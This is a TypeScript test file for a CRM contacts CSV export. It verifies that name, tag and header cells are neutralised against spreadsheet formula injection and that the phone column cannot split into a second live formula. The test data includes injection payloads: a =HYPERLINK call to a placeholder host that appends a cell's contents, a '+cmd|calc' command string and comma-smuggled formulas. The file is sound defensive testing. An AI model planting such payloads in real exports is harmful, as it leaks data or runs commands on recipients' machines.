/**
 * The CRM contacts export opens as data, not as instructions (LX-1, XC-18).
 *
 * Names arrive from the public contact / booking forms, which take no
 * authentication, so every text cell must be neutralised by the shared BC-1
 * rule. The phone column is the one documented exception: it keeps Excel's
 * `="…"` text form so a leading zero or `+` survives — but only for a value
 * that is phone-shaped, and CSV-quoted so a comma cannot split it.
 */

import { CSV_BOM } from '@/lib/payments/csv';
import { buildContactsCsvFile, phoneCsvField } from '@/lib/crm/contactsCsv';

const HEADERS = ['First', 'Last', 'Email', 'Phone', 'Stage', 'Source', 'Tags', 'Created'];
const PHONE = 3;

/** The file's data lines, BOM removed, header dropped. */
const dataLines = (file: string) => file.slice(CSV_BOM.length).split('\r\n').slice(1);

/** Every CSV field in one line: a quoted field, or the unquoted `="…"` phone. */
const fieldsOf = (line: string) =>
  (line.match(/(?:^|,)(?:"(?:[^"]|"")*"|="[^",]*")/g) ?? []).map(f => f.replace(/^,/, ''));

const row = (overrides: Partial<Record<'first' | 'phone' | 'tags', string>> = {}) => [
  overrides.first ?? 'Dana',
  'Levi',
  'dana@example.com',
  overrides.phone ?? '0541234567',
  'Lead',
  'website',
  overrides.tags ?? '',
  '10/25/2026',
];

describe('every text cell is neutralised', () => {
  it('a lead-form name of =HYPERLINK(...) arrives as text', () => {
    const file = buildContactsCsvFile(
      HEADERS,
      [row({ first: '=HYPERLINK("https://example.invalid/?x="&A1,"Invoice")' })],
      PHONE
    );
    const [line] = dataLines(file);
    // Apostrophe-prefixed (read as text), and the inner quotes CSV-doubled.
    expect(line.startsWith(`"'=HYPERLINK(""https://example.invalid/?x=""&A1,""Invoice"")"`)).toBe(true);
  });

  it.each([
    ['-', '-2+3'],
    ['@', '@SUM(A1:A9)'],
    ['+', '+cmd|calc'],
  ])('a cell starting with %s is prefixed', (_char, value) => {
    const [line] = dataLines(buildContactsCsvFile(HEADERS, [row({ tags: value })], PHONE));
    expect(line).toContain(`"'${value}"`);
  });

  it('a plain number in a text column is left a number', () => {
    const [line] = dataLines(buildContactsCsvFile(HEADERS, [row({ tags: '-1' })], PHONE));
    expect(line).toContain(',"-1",');
  });

  it('headers go through the same rule', () => {
    const file = buildContactsCsvFile(['=bad', ...HEADERS.slice(1)], [], PHONE);
    expect(file.slice(CSV_BOM.length).startsWith(`"'=bad"`)).toBe(true);
  });

  it('starts with the BOM and uses CRLF, as toCsvFile does', () => {
    const file = buildContactsCsvFile(HEADERS, [row(), row()], PHONE);
    expect(file.startsWith(CSV_BOM)).toBe(true);
    expect(dataLines(file)).toHaveLength(2);
  });

  it('writes exactly the rows it is given', () => {
    const rows = Array.from({ length: 20 }, () => row());
    expect(dataLines(buildContactsCsvFile(HEADERS, rows, PHONE))).toHaveLength(20);
  });
});

describe('the phone exception', () => {
  it('keeps an international +972 number as text', () => {
    expect(phoneCsvField('+972541234567')).toBe('="+972541234567"');
  });

  it('keeps a leading zero as text', () => {
    expect(phoneCsvField('054-123-4567')).toBe('="054-123-4567"');
  });

  it('is the phone column only', () => {
    const [line] = dataLines(buildContactsCsvFile(HEADERS, [row({ tags: '0541234567' })], PHONE));
    const fields = fieldsOf(line);
    expect(fields[PHONE]).toBe('="0541234567"');
    // The same digits in another column are an ordinary cell.
    expect(fields[6]).toBe('"0541234567"');
  });

  it('is empty for no phone', () => {
    expect(phoneCsvField('')).toBe('""');
    expect(phoneCsvField(null)).toBe('""');
  });

  it('a phone box holding a formula falls back to the neutralised cell', () => {
    expect(phoneCsvField('=HYPERLINK("x")')).toBe(`"'=HYPERLINK(""x"")"`);
  });

  it('a comma cannot split the field and smuggle a second formula', () => {
    // The old code wrote `="1,=HYPERLINK(""x"")"` unquoted, which split at the
    // comma into a second, live formula.
    expect(phoneCsvField('1,=HYPERLINK("x")')).toBe(`"1,=HYPERLINK(""x"")"`);
    const [line] = dataLines(buildContactsCsvFile(HEADERS, [row({ phone: '1,=HYPERLINK("x")' })], PHONE));
    // Still eight fields, and they account for the whole line.
    expect(fieldsOf(line)).toHaveLength(8);
    expect(fieldsOf(line).join(',')).toBe(line);
  });

  it.each(['05"4', '054\r\n=1+1', '054\t1', '054&A1'])(
    '%j is not phone-shaped, so it is an ordinary quoted cell',
    value => {
      expect(phoneCsvField(value).startsWith('"')).toBe(true);
    }
  );

  it('punctuation alone is not a phone', () => {
    // Falls back to the ordinary cell, which csvCell neutralises like any other.
    expect(phoneCsvField('-')).toBe(`"'-"`);
  });
});
